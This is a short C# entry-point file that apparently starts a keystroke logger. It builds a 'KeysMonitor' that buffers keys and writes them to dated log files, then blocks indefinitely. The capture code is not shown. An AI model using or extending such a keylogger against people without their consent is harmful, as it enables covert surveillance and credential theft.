using System;
using System.Threading;
using wls.Buffer;

namespace wls
{
    class Program
    {
        private static ManualResetEvent waitHandle = new ManualResetEvent(false);
        static void Main()
        {
            var km = new KeysMonitor(new FileFlash(Config.LogFileName, Config.LogFileDatePattern), new SmartBufferProcessor())
                {
                    FlashInterval = Config.FlashInterval
                };
            km.Start();
            waitHandle.WaitOne();
        }
    }
}
